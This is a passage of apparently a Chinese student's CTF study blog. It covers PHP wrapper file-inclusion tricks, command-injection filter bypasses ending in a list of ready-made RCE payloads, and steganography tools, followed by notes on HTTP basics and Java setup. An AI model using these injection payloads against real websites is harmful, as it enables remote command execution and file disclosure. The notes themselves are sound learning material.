<h3 id="2-1php伪协议"><a href="#2-1php伪协议" class="headerlink" title="2.1php伪协议"></a>2.1php伪协议</h3><p>PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(Remote File Inclusion RFI)”。</p>
<p>allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件</p>
<p>常用到伪协议的php://input和php://filter.其中php://input要求allow_url_include设置为On</p>
<p>file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>?page=data://text/plain,</p>
<p>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
<h3 id="2-2RCE之命令执行中的各种绕过"><a href="#2-2RCE之命令执行中的各种绕过" class="headerlink" title="2.2RCE之命令执行中的各种绕过"></a>2.2RCE之命令执行中的各种绕过</h3><h4 id="2-2-1常见管道符绕过"><a href="#2-2-1常见管道符绕过" class="headerlink" title="2.2.1常见管道符绕过"></a>2.2.1常见管道符绕过</h4><p>windows</p>
<ol>
<li> “|”：直接执行后面的语句。 </li>
<li> “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。 </li>
<li> “&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。 </li>
<li> “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。 </li>
</ol>
<p>linux</p>
<ol>
<li> “;”：执行完前面的语句再执行后面的语句。 </li>
<li> “|”：显示后面语句的执行结果。 </li>
<li> “||”：当前面的语句执行出错时，执行后面的语句。 </li>
<li> “&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。 </li>
<li> “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。 </li>
</ol>
<h4 id="2-2-2空格及关键词过滤绕过"><a href="#2-2-2空格及关键词过滤绕过" class="headerlink" title="2.2.2空格及关键词过滤绕过"></a>2.2.2空格及关键词过滤绕过</h4><p>我们使用ls flag_is_here列出子目录的文件，免不了绕过空格和flag的顾虑，绕过空格前面已经有writeup中附带了相关技巧，我们这里使用${IFS}绕过</p>
<p>绕过flag关键字，我们使用的方法也是多种多样，这里不一一列出了，经过尝试可以使用(来绕过关键字过滤，如fl)ag_is_here</p>
<p>$IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space,tab, newline 即空格，制表符，空行来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p>
<p>直接用$IFS的话，会认为解析没结束，会把后面的也当做参数解析，比如cat$IFSflag.php，会把IFSflag一起当变量解析。这时候需要在$IFS后面进行截断，使解析为空，结束 $IFS，正常执行后面的内容。</p>
<p>cat$IFS$1flag.php    //使用特殊变量</p>
<p>cat${IFS}flag.php    //使用{}</p>
<p>cat$IFS’f’lag.php        //使用引号</p>
<p>cat$IFS\flag.php    //使用转义符</p>
<p>cat$IFS?lag.php        //使用通配符</p>
<p>在PHP下，空格可以使用%09(tab)、%0a(换行)替代</p>
<h4 id="2-2-3引入绕过空格过滤的字符："><a href="#2-2-3引入绕过空格过滤的字符：" class="headerlink" title="2.2.3引入绕过空格过滤的字符："></a>2.2.3引入绕过空格过滤的字符：</h4><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
<h4 id="2-2-4运算符过滤绕过"><a href="#2-2-4运算符过滤绕过" class="headerlink" title="2.2.4运算符过滤绕过"></a>2.2.4运算符过滤绕过</h4><p>首先我们要使用ls列目录，发现这里过滤了运算符，绕过的方式有%0a、%0d、%0D%0A。</p>
<h4 id="2-2-5引号绕过"><a href="#2-2-5引号绕过" class="headerlink" title="2.2.5引号绕过"></a>2.2.5引号绕过</h4><p>c’at’|c”at”|c``at|c\at</p>
<p>当cat命令被过滤时，可以用以下命令代替：</p>
<p>tac|more|less|curl|nl|tail|sort|strings|head|paste|od -a</p>
<p>strings：显示文件中的可打印内容，一般用来查看非文本内容</p>
<p>sort：可针对文本文件的内容，以行为单位来排序。</p>
<p>curl：会发送 GET 请求来获取链接内容到标准输出</p>
<p>head：只显示前几行内容，如果文本较长，需要加上参数 -n</p>
<p>paste：会把每个文件以列对列的方式，一列列地加以合并。</p>
<h4 id="2-2-6通配符绕过"><a href="#2-2-6通配符绕过" class="headerlink" title="2.2.6通配符绕过"></a>2.2.6通配符绕过</h4><p>*和?是Linux中的两种通配符，可以用他们代替关键字</p>
<p>cat * //输出当前目录下所有文件内容</p>
<p>/bin/c?t fl?g.php</p>
<h4 id="2-2-7命令执行通杀payload（来自Y4大佬）（依据题目而定）"><a href="#2-2-7命令执行通杀payload（来自Y4大佬）（依据题目而定）" class="headerlink" title="2.2.7命令执行通杀payload（来自Y4大佬）（依据题目而定）"></a>2.2.7命令执行通杀payload（来自Y4大佬）（依据题目而定）</h4><p>payload1:c=nl%09fla\g.php||</p>
<p>payload2:c=nl%09fla\g.php%0a</p>
<p>payload3:c=nl%09fla’’g.php%0a</p>
<p>payload4:c=nl%09fla””g.php%0a</p>
<p>payload5:c=vi%09fla\g.php%0a</p>
<p>payload6:c=tac%09fla\g.php%0a</p>
<p>payload7:c=uniq%09fla\g.php%0a</p>
<p>payload8:c=nl&lt;fla’’g.php||</p>
<p>payload9:c=nl%09fla\g.php%26</p>
<h4 id="2-2-8无参数rce"><a href="#2-2-8无参数rce" class="headerlink" title="2.2.8无参数rce"></a>2.2.8无参数rce</h4><p>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</p>
<p>pos()：返回数组中的当前元素的值。</p>
<p>array_reverse()：数组逆序 scandir()：获取目录下的文件</p>
<p>next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过</p>
<p>pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。</p>
<h4 id="2-2-9命令分隔符表示"><a href="#2-2-9命令分隔符表示" class="headerlink" title="2.2.9命令分隔符表示"></a>2.2.9命令分隔符表示</h4><p>我们要让命令回显，那么进行命令分隔即可</p>
<p>; //分号</p>
<p>| //只执行后面那条命令</p>
<p>|| //只执行前面那条命令</p>
<p>&amp; //两条命令都会执行</p>
<p>&amp;&amp; //两条命令都会执行</p>
<h4 id="2-3-0参考链接"><a href="#2-3-0参考链接" class="headerlink" title="2.3.0参考链接"></a>2.3.0参考链接</h4><p><a href="https://www.cnblogs.com/pursue-security/p/15291426.html">https://www.cnblogs.com/pursue-security/p/15291426.html</a></p>
<h3 id="3-1linux日志文件"><a href="#3-1linux日志文件" class="headerlink" title="3.1linux日志文件"></a>3.1linux日志文件</h3><p>　   root:x:0:0:root:/root:/bin/bash </p>
<p>　　bin:x:1:1:bin:/bin:/sbin/nologin </p>
<p>　　daemon:x:2:2:daemon:/sbin:/sbin/nologin </p>
<p>　　desktop:x:80:80:desktop:/var/lib/menu/kde:/sbin/nologin </p>
<p>　　mengqc:x:500:500:mengqc:/home/mengqc:/bin/bash </p>
<p>　　在该文件中，每一行用户记录的各个数据段用“：”分隔，分别定义了用户的各方面属性。各个字段的顺序和含义如下： </p>
<p>　　注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序 </p>
<p>　　(1)注册名(login_name)：用于区分不同的用户。在同一系统中注册名是惟一的。在很多系统上，该字段被限制在8个字符(字母或数字)的长度之内；并且要注意，通常在Linux系统中对字母大小写是敏感的。这与MSDOS/Windows是不一样的。 </p>
<p>　　(2)口令(passwd)：系统用口令来验证用户的合法性。超级用户root或某些高级用户可以使用系统命令passwd来更改系统中所有用户的口令，普通用户也可以在登录系统后使用passwd命令来更改自己的口令。 </p>
<p>　　现在的Unix/Linux系统中，口令不再直接保存在passwd文件中，通常将passwd文件中的口令字段使用一个“x”来代替，将/etc /shadow作为真正的口令文件，用于保存包括个人口令在内的数据。当然shadow文件是不能被普通用户读取的，只有超级用户才有权读取。 </p>
<p>　　此外，需要注意的是，如果passwd字段中的第一个字符是“*”的话，那么，就表示该账号被查封了，系统不允许持有该账号的用户登录。 </p>
<p>　　(3)用户标识号(UID)：UID是一个数值，是Linux系统中惟一的用户标识，用于区别不同的用户。在系统内部管理进程和文件保护时使用 UID字段。在Linux系统中，注册名和UID都可以用于标识用户，只不过对于系统来说UID更为重要；而对于用户来说注册名使用起来更方便。在某些特 定目的下，系统中可以存在多个拥有不同注册名、但UID相同的用户，事实上，这些使用不同注册名的用户实际上是同一个用户。 </p>
<p>　　(4)组标识号(GID)：这是当前用户的缺省工作组标识。具有相似属性的多个用户可以被分配到同一个组内，每个组都有自己的组名，且以自己的组标 识号相区分。像UID一样，用户的组标识号也存放在passwd文件中。在现代的Unix/Linux中，每个用户可以同时属于多个组。除了在 passwd文件中指定其归属的基本组之外，还在/etc/group文件中指明一个组所包含用户。 </p>
<p>　　(5)用户名(user_name)：包含有关用户的一些信息，如用户的真实姓名、办公室地址、联系电话等。在Linux系统中，mail和finger等程序利用这些信息来标识系统的用户。 </p>
<p>　　(6)用户主目录(home_directory)：该字段定义了个人用户的主目录，当用户登录后，他的Shell将把该目录作为用户的工作目录。 在Unix/Linux系统中，超级用户root的工作目录为/root；而其它个人用户在/home目录下均有自己独立的工作环境，系统在该目录下为每 个用户配置了自己的主目录。个人用户的文件都放置在各自的 </p>
<p>　　主目录下。 </p>
<p>　　(7)命令解释程序(Shell)：Shell是当用户登录系统时运行的程序名称，通常是一个Shell程序的全路径名， </p>
<p>　　如/bin/bash。 </p>
<p>　　需要注意的是，系统管理员通常没有必要直接修改passwd文件，Linux提供一些账号管理工具帮助系统管理员来创建和维护用户账号。 </p>
<p>　　Linux口令管理之/etc/passwd文件 </p>
<p>　　/etc/passwd文件是Linux/UNIX安全的关键文件之一.该文件用于用户登录时校验 用户的口令,当然应当仅对root可写.文件中每行的一般格式为: </p>
<p>　　LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL </p>
<p>​       nginx的日志文件为/var/log/nginx/access.log</p>
<h4 id="3-1-1参考链接"><a href="#3-1-1参考链接" class="headerlink" title="3.1.1参考链接"></a>3.1.1参考链接</h4><p><a href="https://www.jianshu.com/p/fbb132422c9d">https://www.jianshu.com/p/fbb132422c9d</a></p>
<h3 id="4-1正则表达式修正符"><a href="#4-1正则表达式修正符" class="headerlink" title="4.1正则表达式修正符"></a>4.1正则表达式修正符</h3><p>正则表达式中常用的模式修正符有i、g、m、s、U、x、a、D、e 等。</p>
<p>它们之间可以组合搭配使用。</p>
<p>i 不区分(ignore)大小写；</p>
<p>例如: /abc/i 可以匹配 abc、aBC、Abc </p>
<p>g 全局(global)匹配 </p>
<p>如果不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功，返回</p>
<p>如果带g，则字符串从左到右，找到每个符合条件的都记录下来，知道字符串结尾位置</p>
<p>例如: </p>
<p>var str = ‘aaaaaaaa’</p>
<p>var reg1 = /a/;  str.match(reg1)  // 结果为：[“a”, index: 0, input: “aaaaaaaa”]</p>
<p>var reg2 = /a/g; str.match(reg2)  // 结果为：[“a”, “a”, “a”, “a”, “a”, “a”, “a”, “a”]</p>
<p>m 多(more)行匹配</p>
<p>若存在换行\n并且有开始^或结束$符的情况下，和g一起使用实现全局匹配,</p>
<p>因为存在换行时默认会把换行符作为一个字符任务匹配字符串是个单行，</p>
<p>g只匹配第一行，添加m之后实现多行，每个换行符之后就是开始</p>
<p>var str = “abcggab\nabcoab”;</p>
<p>var preg1 = /^abc/gm;  str.match(preg1)  // 结果为：[“abc”, “abc”]</p>
<p>var preg2 = /ab$/gm;   str.match(preg2)  // 结果为：[“ab”, “ab”]</p>
<p>s 特殊字符圆点 . 中包含换行符</p>
<p>默认的圆点 . 是 匹配除换行符 \n 之外的任何单字符，加上s之后, . 中包含换行符</p>
<p>$str = “abggab\nacbs”;</p>
<p>$preg = “/b./s”;</p>
<p>preg_match_all($preg, $str,$matchs);</p>
<p>print_r($matchs);//Array ( [0] =&gt; Array ( [0] =&gt; bg [1] =&gt; b [2] =&gt; bs ) ) </p>
<p>U 只匹配最近的一个字符串;不重复匹配; </p>
<p>$mode=”/a(.*?)c/“;</p>
<p>$preg=”/a.*c/U”;//这两个正则返回相同的值</p>
<p>$str=”abcabbbcabbbbbc” ;</p>
<p>preg_match($mode,$str,$content);   echo $content[0];//abc</p>
<p>preg_match($preg,$str,$content);   echo $content[0];//abc</p>
<p>//修正符:x 将模式中的空白忽略; </p>
<p>//修正符:A 强制从目标字符串开头匹配;</p>
<p>//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; </p>
<p>//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </p>
<h4 id="4-1-1参考链接"><a href="#4-1-1参考链接" class="headerlink" title="4.1.1参考链接"></a>4.1.1参考链接</h4><p><a href="https://www.cnblogs.com/kevin-yuan/archive/2012/09/25/2702167.html">https://www.cnblogs.com/kevin-yuan/archive/2012/09/25/2702167.html</a></p>
<h3 id="5-1MISC"><a href="#5-1MISC" class="headerlink" title="5.1MISC"></a>5.1MISC</h3><h4 id="5-1-1伪加密"><a href="#5-1-1伪加密" class="headerlink" title="5.1.1伪加密"></a>5.1.1伪加密</h4><p>用010hex打开zip文件。</p>
<p>把504B0304后的第3、4个byte改成0000还有</p>
<p>把504B0102后的第5、6个byte改成0000即可破解伪加密。</p>
<p>##识别真假加密</p>
<p>无加密</p>
<p>压缩源文件数据区的全局加密应当为00 00</p>
<p>且压缩源文件目录区的全局方式位标记应当为00 00</p>
<p>假加密</p>
<p>压缩源文件数据区的全局加密应当为00 00</p>
<p>且压缩源文件目录区的全局方式位标记应当为09 00</p>
<p>真加密</p>
<p>压缩源文件数据区的全局加密应当为09 00</p>
<p>且压缩源文件目录区的全局方式位标记应当为09 00</p>
<h4 id="5-1-2工具stefhide"><a href="#5-1-2工具stefhide" class="headerlink" title="5.1.2工具stefhide"></a>5.1.2工具stefhide</h4><p>Steghide是一个可以将文件隐藏到图片或音频中的工具</p>
<p>隐藏文件</p>
<p>steghide embed -cf [图片文件载体] -ef [待隐藏文件]</p>
<p>steghide embed -cf 1.jpg -ef 1.txt</p>
<p>查看图片中嵌入的文件信息</p>
<p>steghide info 1.jpg</p>
<p>提取图片中隐藏的文件</p>
<p>steghide extract -sf 1.jpg</p>
<p>使用steghide发现图片有隐写文件，使用steghide extract -sf good.jpg，空密码即可</p>
<p><a href="https://blog.csdn.net/Aluxian_/article/details/121968033">https://blog.csdn.net/Aluxian_/article/details/121968033</a></p>
<h4 id="5-1-3工具F5-steganography"><a href="#5-1-3工具F5-steganography" class="headerlink" title="5.1.3工具F5-steganography"></a>5.1.3工具F5-steganography</h4><p>f5隐写，利用工具：F5-steganography: <a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p>
<p>命令：java Extract C:\Users\alun\OneDrive\桌面\Misc.jpg</p>
<p>会在f5隐写工具的目录下生成文件夹</p>
<h2 id="二、学习总结"><a href="#二、学习总结" class="headerlink" title="二、学习总结"></a>二、学习总结</h2><p>2022年11月12日八点半到十一点，打了安工第一届信安大赛，有些感悟。</p>
<p>这次比赛属于新生赛，赛题都比较简单，可惜我没有写出几题，结果有些不尽人意。</p>
<p>说一下为什么。</p>
<p>缺乏做题经验，web题目四道写出两道，re写两道，pwn写一道，misc写一道，好像没了，写出来的这几题都很简单，动动手就出了，没写出来的也没觉得很难，很多都是出了一般，没思路了。对于Crypto这一类更是一题都不会做，主要不会写脚本……</p>
<p>这两天写了一些MISC题目，总结了以下几点思路</p>
<p>1.对于图片隐写这类题型，先看属性，说不定有惊喜。属性中可能带有描述，以及分辨率，对于分辨率我们可以判断图片是否缺少，若缺少就用winhex修改图片的宽高。有些flag直接用winhex查找字符串就能得到。</p>
<p>2.第二步用winhex打开查看文件头，每个类型的文件都有不同类型的文件头，说不准某些png，jpg文件中会有zip头部，这样直接修改后缀为zip解压或是扔到kali用binwalk分离。</p>
<p>3.有些压缩包中的文件解压需要密码，这时就要看是否为伪加密，判断加密类型之后题目大概就能做出来了。</p>
<p>4.有些题目中给了压缩密码的提示，比如四位纯数字，这时我们就可以直接用ziperllo（破解rar文件）与ARCHPR(破解zip文件)爆破密码。</p>
<p>5.对于LSB类的题目，首先扔进Stegsolve中对其RGB调整为0，查看hex，根据hex保存其文件类型，比如PK头就是zip文件类型等等。</p>
<p>6.对于二次解压题目，需要将隐藏文件用foremost分离。</p>
<p>7.流量分析题目就查看流量包，然后追踪http或者tcp流（还需做题加深一下）</p>
<p>8.二维码之类的题目，若完整就用CQR识别,不完整就想办法补充完整。</p>
<p>差不多就这些，以后再做补充。</p>
<h2 id="三、下周计划"><a href="#三、下周计划" class="headerlink" title="三、下周计划"></a>三、下周计划</h2><p>下周主攻MISC，学一下python脚本编写。副攻web中的命令执行和php特性这类题目。</p>
<p>加油(ง •_•)ง</p>
]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结三</title>
    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
<span id="more"></span>

<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
<p>然后输入命令</p>
<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
<p>如</p>
<p>certutil -hashfile  webpro.war MD5</p>
<p>注意后面有个MD5,不然会生成一个其他的值。</p>
]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结二</title>
    <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
    <content><![CDATA[<p><strong>本周重点</strong></p>
<p><strong>1.学习进展</strong></p>
<p>1.完成burpsuite的安装以及java环境的配置。</p>
<p>2.完成对http协议的学习以及对url，web前端的一些浅显的了解。</p>
<p>3.了解了公网ip和内网ip的区别.</p>
<span id="more"></span>

<p><strong>2.遗留问题</strong></p>
<p>​        <strong>1.内网IP与公网IP的联系和区别是什么。内网IP是不是有很多，而公网IP只有几个或者是某些内网IP连接一个公网IP。</strong></p>
<p>​         <strong>2.自己电脑上设置的IP地址会不会与别人的IP地址想冲突，导致自己上不了网。</strong></p>
<p><strong>3.下周计划</strong></p>
<p>1.学习数据库基础</p>
<p>2.学习SQL基础</p>
<p>3.学习MySQL部署与使用</p>
<p><strong>4.思考总结</strong></p>
<p>​         <strong>首先总结一下burpsuite的安装与Java环境的配置！</strong></p>
<p><strong>1.首先找到系统设置中的高级系统设置，点击环境变量。</strong></p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062708-feae412f-7908-4f68-ba33-568ff1651b65.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062309-ab8cf4dd-78dc-42d6-8c55-a47e3cedadfa.gif" alt="img"></p>
<p><strong>2.找到系统变量path设置</strong></p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062542-7e15a7f3-0076-4b0f-8c92-1ca5a60fa4f6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062311-b40a5d85-b7bc-497d-953d-f3efb211d2ed.gif" alt="img"></p>
<p><strong>3.点击并编辑两条新的文本</strong></p>
<p>%JAVA_HOME%\bin %JAVA_HOME%\jre\bin</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062302-c19e5f59-de13-4cb6-8981-8291facc8652.gif" alt="img"></p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062817-a06cd932-0656-4e3b-9bd1-ca7960eb396c.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062872-b4fb976d-c5fa-44da-9ffd-2791761c576f.gif" alt="img"></p>
<p><strong>4.添加新的系统变量JAVA_HOME</strong></p>
<p>变量值是jdk的安装路径。</p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062938-cd99e78e-4be7-4026-91e8-552b03b1cee6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063259-9af407bf-8cf7-42ea-ba47-33d2ea98f103.gif" alt="img"></p>
<p><strong>5.添加CLASSPATH这个新的系统变量</strong></p>
<p>变量值是 </p>
<p>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063917-b33286fc-1178-46ab-b6dd-7acab372a840.gif" alt="img"></p>
<p>切记，最前方有  .；</p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366063982-e583a5d7-21c3-4073-8b27-fd7c18617131.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064047-80a7e79e-fc19-4e04-8db4-6f86203c3184.gif" alt="img"></p>
<p><strong>6.配置完成后点击确定。</strong></p>
<p><strong>7.在cmd命令中输入java -version和javac -version</strong></p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366064353-75e1c6b8-34aa-4ca2-974f-7cd94ea171a2.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064407-b4ff7bdc-d542-42f5-b1da-6eba6d7c0c4b.gif" alt="img"></p>
<p>若出现版本号，则Java环境配置成功。</p>
<p>后面的burpsuite安装过程很简单，这里不细讲。</p>
<hr>
<p>​                          <strong>第二，总结一下http协议</strong></p>
<p><strong>Request请求数据包</strong></p>
<p>HTTP规划定义了8种可能的请求方法:</p>
<p>1 GET:检索URL中标识资源的一个简单请求</p>
<p>2HEAD:与GET方法相同， 服务器只返回状态行和头标，并不返回请求文档</p>
<p>3 POST: 服务器接受被写入客户端输出流中的数据的请求</p>
<p>4PUT:服务器保存请求数据作为指定URI新内容的请求</p>
<p>5DELETE:服务器删除URL中命令的资源的请求</p>
<p>6OPTIONS:关于服务器支持的请求方法信息的请求</p>
<p>7 TRACE: web服务器反馈Http请求和其头标的请求</p>
<p>8 CONNECT :已文档化，但当前未实现的一个方法，预留做隧道处理</p>
<p>例如：</p>
<p>请求行     GET /index.html HTTP/1.1</p>
<p>请求方法：GET    请求url：index.html   HTTP版本：HTTP/1.1</p>
<p>​                                                                                                       <strong>划重点！！！</strong></p>
<p><strong>下面用chrome浏览器对某一网页进行检查</strong></p>
<p>我们随便进入一个网页如下图</p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366519046-3e22d4cb-35a5-43a4-8fff-bb784d430c7d.png" alt="img"></p>
<p>然后点击network</p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366577455-cf0bf193-ab72-4cf7-b541-79a51ecd6e63.png" alt="img"></p>
<p>按住ctrl+r</p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366610192-8c8d1065-d648-4a5c-9db6-ccae8fdc9937.png" alt="img"></p>
<p>就可以得到这一网站里的内容，<strong>这就类似于burp suite的抓包</strong></p>
<p><strong>我们看一下请求数据包request header</strong></p>
<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366748992-dd527888-897e-48e3-8fd8-67789024a49d.png" alt="img"></p>
<p>可以清楚的看到，他的请求数据包里的<strong>请求行</strong>是GET————一直到HTTP/1.1</p>
<p>GET后的一大串内容则是检索URL中的标识资源。</p>
<p><em><strong>我们说一下url的组成</strong></em></p>
<p>URL简单来说就是输入地址栏里的一大串网址，按此网页的地址栏内的网址为例<a href="https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG">https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG</a></p>
<p> 第一部分是url方案，方案可以告知web客户端要怎么访问资源。这里是https://，也就是https协议。常见的还有http、ftp等。<br>第二部分指定服务器的位置，这部分告知web客户端资源的位置。例子中是ayitsec.yuque.com<br>第三部分是资源路径，路径说明了资源在服务器的位置。也即是例子中的</p>
<p>staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG  </p>
<p><strong>我的理解：</strong></p>
<p><strong>1.请求行下面的都是请求头，其中HOST请求头里面的内容则是url中的第二部分——指定服务器位置</strong></p>
<p> <strong>2.我们说的http协议有八种请求方法，其中最常用的两种请求方法是get与post。</strong></p>
<p> <strong>3.GET请求把参数放在url中，POST请求通过request body传递参数（也就是空行下的那一行）。而且GET请求对url中传送的参数有长度限制，而POST 则没有长度限制。</strong></p>
<p> <strong>4.GET请求里，请求行中‘？’分割实际的url和参数，‘&amp;’是url指定的参数间的分隔符。所以，我们的例子中的参数就是</strong>toc_node_uuid=w9bQEpfPpVSSY8SG               </p>
<p>请求头：</p>
<p>1.HOST：主机或域名地址。对应网址URL中的Web名称和端口号。</p>
<p>2.Accept:指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。</p>
<p>3.User-Agent: 是客户浏览器名称</p>
<p>4.Accept-Langeuage: 指出浏览器可以接受的语言种类，如en或en-us， 指英语。</p>
<p>5.connection: 用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1使用Keep-Alive为默认值， 这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接。（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点。</p>
<p>6 Cookie: 浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</p>
<p>7 Referer: 表明产生请求的网页URL。 如比从网页/ icconcept/ index. jsp中点击一个链接到网页/icwork/ search，在向服务器发送的GET/icwork/ search中的请求中，Referer是<a href="http://hostname:8080/icconcept">http://hostname:8080/icconcept</a> /index.jsp.</p>
<p>8 Content-Type: 用来表名request的内容类型。可以用HttpServletRequest的getContentType ()方法取得。</p>
<p>9 Accept-Charset: 指出浏览器可以接受的字符编码。英文浏览器的默认值是IS0-8859-1.</p>
<p>10 Accept-Encoding: 指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到web响应之后先解码，然后再检查文件格式。</p>
<p>空行</p>
<p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p>
<p>请求数据</p>
<p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
<p><strong>Response返回数据包数据格式</strong></p>
<p>1.状态行：协议版本，数字形式的状态代码和状态描述，个元素之间以空格分隔</p>
<p>2.响应头标:包含服务器类型、日期、长度、内容类型等</p>
<p>3.空行:响应头与响应体之间用空行隔开</p>
<p>4.响应数据:浏览器会将实体内容中的数据取出来，生成相应的页面</p>
<p>HTTP响应码:</p>
<p>1xx: 信息，请求收到，继续处理</p>
<p>2xx: 成功，行为被成功地接受、理解和采纳</p>
<p>3xx: 重定向，为了完成请求，必须进一步执行的动作</p>
<p>4xx:客户端错误</p>
<p>5xx:服务器错误</p>
<p>200 存在文件</p>
<p>403 存在文件夹</p>
<p>3xx 均可能存在</p>
<p>404 不存在文件及文件夹</p>
<p>500 均可能存在</p>
<hr>
<p>​                             <em><strong>第三.内网ip和公网ip</strong></em></p>
<p>内网ip：路由器以内的网络。可以连接互联网，但是互联网无法直接连接内网（需要端口映射）</p>
<p>公网IP：互联网IP地址。</p>
